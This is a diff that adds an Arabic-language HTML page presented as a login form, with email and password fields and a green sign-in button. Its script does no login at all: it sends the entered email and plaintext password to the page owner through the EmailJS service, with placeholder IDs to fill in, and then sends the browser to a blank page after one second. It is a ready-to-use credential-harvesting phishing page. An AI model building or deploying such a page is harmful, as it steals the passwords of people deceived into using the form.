@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل دخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        /* تنسيق المستطيل العلوي */
+        .rectangle {
+            background-color: #fff;
+            border: 2px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* تنسيق المربع الأخضر الصغير */
+        .login-button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .login-button:hover {
+            background-color: darkgreen;
+        }
+
+        /* تنسيق عنوان "سجل دخول" */
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="title">سجل دخول</div>
+    
+    <!-- مستطيل لاسم المستخدم -->
+    <div class="rectangle">
+        <label for="amil">البريد الإلكتروني:</label>
+        <input type="text" id="amil" name="amil" placeholder="أدخل بريدك الإلكتروني هنا">
+    </div>
+
+    <!-- مستطيل لكلمة المرور -->
+    <div class="rectangle">
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور">
+    </div>
+
+    <!-- زر دخول -->
+    <button class="login-button" onclick="submitForm()">دخول</button>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // إعداد EmailJS
+        emailjs.init("user_xxx");  // استبدل "user_xxx" بمعرف المستخدم الخاص بك من EmailJS
+
+        // دالة لإرسال البيانات عبر البريد الإلكتروني
+        function submitForm() {
+            const amil = document.getElementById('amil').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البريد الإلكتروني باستخدام خدمة EmailJS
+            const templateParams = {
+                amil: amil,
+                password: password,
+            };
+
+            emailjs.send('service_your_service_id', 'template_your_template_id', templateParams)
+                .then(function(response) {
+                    console.log('تم إرسال البيانات بنجاح', response);
+                }, function(error) {
+                    console.log('فشل في إرسال البيانات', error);
+                });
+
+            // إغلاق الصفحة بعد 1 ثانية
+            setTimeout(() => {
+                window.location.href = "about:blank";  // أغلق الصفحة
+            }, 1000); // بعد 1 ثانية
+        }
+    </script>
+</body>
+</html>
